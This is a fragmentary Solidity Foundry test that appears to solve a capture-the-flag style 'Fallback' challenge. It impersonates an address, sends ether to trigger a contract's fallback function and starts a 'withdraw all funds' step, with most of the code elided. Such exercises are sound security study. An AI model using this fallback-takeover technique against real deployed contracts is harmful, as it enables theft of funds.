...
contract FallbackAttack is Test {
    ...
    address payable p1 = payable(address(0x35524A1a02D6C89C8FceAd21644cB61b032BD3DE));
    ...
    function fund(uint _amount) public payable returns (bool) {
    ...
    function triggerFallback() public payable returns (bool) {
        vm.prank(p1, p1);
        (bool triggeredFallback, bytes memory data) = address(fallbackContract).call{value: 0.0001 ether}("");
    ...
    */
    function testAttack() public payable {
        ...
        // withdraw all funds
        uint balBeforeP1 = address(p1).balance;
        uint balBeforeFallback = address(fallbackContract).balance;
        vm.prank(p1, p1);
